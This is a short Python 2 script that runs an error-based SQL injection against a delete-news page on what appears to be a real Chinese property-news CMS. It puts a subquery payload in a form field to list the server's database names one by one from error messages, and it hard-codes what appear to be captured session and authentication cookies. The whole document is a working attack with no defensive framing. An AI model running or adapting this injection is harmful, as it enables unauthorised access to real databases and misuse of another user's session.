import requests



print 'Start to retrive SqlServer database:\n'

user = ""

headers = {

'Cookie': 'ASP.NET_SessionId=adg4hn45zmhams55u50mil45; .dichancmsauth=994F1406866FA51A1EF32B936496199631077780812E3830EBE65D54D52FB04F3C216D0FDC8256BA7CAC46C0DC4DC5376641396484DAE46DFB6C09C1CD24E7EA70FA50877E567F584A097E8006E539BCBB907765ED9E4B7096F89B393EB77543AC9CBE7F; __utmt=1; __utma=21884462.522624074.1460635410.1460635410.1460635410.1; __utmb=21884462.2.10.1460635410; __utmc=21884462; __utmz=21884462.1460635410.1.1.utmcsr=cms.dichan.com|utmccn=(referral)|utmcmd=referral|utmcct=/comment/newscommentlist.aspx'};

for i in range(1, 14):

payload = '0/(select top 1 name from master..sysdatabases where name not in (select top %s name from master..sysdatabases))' % i

body = {'__VIEWSTATE': '/wEPDwUKMTkwNjc4NTIwMWRkXGYxEvkDlDR5TJiN9oPRDcCJMgo=',

'__VIEWSTATEGENERATOR': '59FA1B9F',

'__EVENTVALIDATION': '/wEWAwKqv92KDALZifH9CgKM54rGBghPZBNspYOcVa/5oCp6+cB/NDlD',

'housenewsIds': payload, 'Button1': '%E7%A1%AE%E5%AE%9A'}

url = 'http://cms.dichan.com/news/deletenews.aspx'

conn = requests.post(url, data=body, headers=headers, verify=False, allow_redirects=False)

html_doc = conn.content

conn.close()

print ".",

if conn.status_code == 200:

break

# get tables from response

begain = html_doc.index('nvarchar')

end = html_doc.index('int')

database = html_doc[begain + 14:end - 24]

user += database + ' , '

print database

print '\n[Done] SqlServer database is %s' % user
